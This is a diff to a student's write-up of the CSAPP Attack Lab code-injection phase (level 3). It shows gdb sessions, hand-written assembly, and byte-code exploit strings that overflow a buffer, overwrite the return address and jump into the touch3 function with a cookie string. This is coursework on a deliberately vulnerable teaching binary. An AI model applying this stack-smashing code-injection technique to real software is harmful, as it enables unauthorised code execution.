@@ -1808,7 +1808,7 @@ Rerun the program to the beginning of `hexmatch`.
 0x5561dc80:     0x78
 ```
 
-3.1.3) Now the content in `%rsp`  is `0x5561dc00` and that in `%rbp` is `0x5561dc78` when the instruction at `0x401857` is being executed. 
+3.1.3) Currently, the content in `%rsp`  is `0x5561dc00` and that in `%rbp` is `0x5561dc78` when the instruction at `0x401857` is being executed. 
 
 ```shell
 (gdb) print /x $rsp
@@ -1819,12 +1819,144 @@ $11 = 0x5561dc78
 0x5561dc78:     "59b997fax\334aU"
 ```
 
-After the following instruction, the string at `(%rbp) 0x5561dc78` becomes empty `""`. The value of the stack canary, `%fs:0x28`,  overwrites it. 
+After the following instruction, the string at `(%rbp) 0x5561dc78` becomes empty `""`. The value of the stack canary in `%rax`, of which the value is passed from `%fs:0x28`,  overwrites it. 
 
 ```assembly
 40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)   # 0x5561dc00 + 0x78 = 0x5561dc78
 ```
 
+Unfortunately, every byte of my exploit code is overwritten by now. I have to move them to another place to prevent them from being replaced. My cookie in the string format should not be replaced at least. Thus, I have to move them to a proper position. 
 
+4) Relocate my exploit code. 
 
+4.1) Here is the modified assembly code. 
+
+4.1.1) First edition of my modified assembly. 
+
+```assembly
+1 # Hand-generated assembly code of the level 3 of part 1.
+2 # Relocate my exploit code not to be replaced by code in "hexmatch".
+3 subq $0x18, $rsp         # 0x5561dc78 - 0x18 = 0x5561dc60
+4 pushq $0x0               # push the ternimal '\0' to the stack. It is at 0x5561dc60.
+5 pushq $0x3539623939376661   # The byte sequecne of  0x59b997fa. It is at 0x5561dc58.
+6 mov $0x5561dc58, %rdi   # Move the address of the string of my cookie to the first argument, %rdi.
+7 pushq $0x4018fa         # Push the address of touch3 to the top of the current stack.
+8 retq
+```
+
+There are something wrong in the first edition of code above. 
+
+1. The assembly code above is wrong! Note `$rsp` should have a prefix of `%rsp`, it is not in `gdb` !!
+2. The x86-64 instruction set doesn't support an 64-bit immediate as an operand of `push`. Hence, the instruction at line 5 is wrong. Instead, `movabs` can move such a long immediate to a register and we can use `push` to push the register to a stack. 
+
+4.1.2) The second edition: 
+
+```assembly
+1 # Hand-generated assembly code of the level 3 of part 1.
+2 # Relocate my exploit code not to be replaced by code in "hexmatch".
+3 sub $0x18, %rsp             # 0x5561dc78 - 0x18 = 0x5561dc60
+4 pushq $0                    # push the ternimal '\0' to the stack. It is at 0x5561dc60.
+5 movabsq $0x3539623939376661, %rax
+6 pushq %rax              # The byte sequecne of  0x59b997fa. It is at 0x5561dc58.
+7 mov $0x5561dc58, %rdi   # Move the address of the string of my cookie to the first argument, %rdi.
+8 pushq $0x4018fa         # Push the address of touch3 to the top of the current stack.
+9 retq
+```
+
+Here is my exploit code which consists of the byte code for the instructions of the assembly code above. 
+
+```assembly
+  1 48 83 ec 18             /* sub    $0x18,%rsp */
+  2 6a 00                   /* pushq  $0x0 */
+  3 48 b8 61 66 37 39 39    /* movabs $0x3539623939376661,%rax */
+  4 62 39 35
+  5 50                      /* push   %rax */  /* The address is 0x5561dc88 */
+  6 48 c7 c7 58 dc 61 55    /* mov    $0x5561dc58,%rdi */
+  7 68 fa 18 40 00          /* pushq  $0x4018fa */
+  8 c3                      /* retq   */ /* My exploit code are 40 bytes in total.  */
+  9 00 00
+ 10 00 00 00 00
+ 11 00 00 00 00
+ 12 78 dc 61 55             /* The top of current stack where my exploit code is.  */
+```
+
+Whereas, there is a "Segmentation fault" when the instruction at lie 6 is being executed. Apparently, `%rax` which holds a 64-bit immediate can't be pushed to the stack. 
+
+```shell
+(gdb)
+Program received signal SIGSEGV, Segmentation fault.
+0x000000005561dc88 in ?? ()
+```
+
+When examining the next instruction in PC, it is corrupted. 
+
+```shell
+(gdb) x/i $pc
+=> 0x5561dc88:  add    %al,(%rax)
+(gdb) x/6i $rsp    
+=> 0x5561dc88:  add    %al,(%rax)   # all the instructions are corrupted.
+   0x5561dc8a:  add    %al,(%rax)
+   0x5561dc8c:  add    %al,(%rax)
+   0x5561dc8e:  add    %al,(%rax)
+   0x5561dc90:  pushq  $0x4018fa
+   0x5561dc95:  retq
+```
+
+To be find out the cause. 
+
+5) N.B. I solve the problem after referencing the solution for this phase from [Ke Changxin](https://github.com/kcxain/CSAPP-Lab). 
+
+Since the stack of `test` is far away from `hexmatch`, it is reasonable to put my cookie there. 
+
+5.1) Find out the address of the top of the stack of `test`.
+
+```shell
+# In test, print the content of %rsp.
+(gdb) print /x $rsp
+$4 = 0x5561dca8
+```
+
+The structure of the `test`'s stack is like this(8 bytes each row): 
+
+![1774996204457](assets/1774996204457.png)
+
+5.2) Rewrite my assembly and generate the byte code of it.
+
+```assembly
+1 # Hand-generated assembly code of the level 3 of part 1.
+2
+3 mov $0x5561dca8, %rdi   # Inject my cookie string on the top of the stack of "test". Then move it to the first argument: %rdi.
+4 pushq $0x4018fa         # Push the address of touch3 to the top of the current stack.
+5 retq
+```
+
+The byte code: 
+
+```assembly
+  7 0000000000000000 <.text>:
+  8    0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
+  9    7:   68 fa 18 40 00          pushq  $0x4018fa
+ 10    c:   c3                      retq
+```
+
+Copy the byte code the to my exploit code. 
+
+```assembly
+1 48 c7 c7 a8 dc 61 55 68
+2 fa 18 40 00 c3 00 00 00
+3 00 00 00 00 00 00 00 00
+4 00 00 00 00 00 00 00 00
+5 00 00 00 00 00 00 00 00
+6 78 dc 61 55 00 00 00 00     /* 0x5561dca0: The return address of "getbuf" is stored here.  */
+7 35 39 62 39 39 37 66 61     /* The top of "test"'s stack. The byte representation of my cookie: 0x59b997fa  */
+8 00 00 00 00 00 00 00 00	 
+```
+
+Then convert it to raw file. 
+
+```shell
+Linux> ./hex2raw < ./part_1/exploit_lv3_optimised2.txt > ./part_1/exploit_lv3_optimised2_raw.txt
+```
+
+Finally, the problem is tackled. 
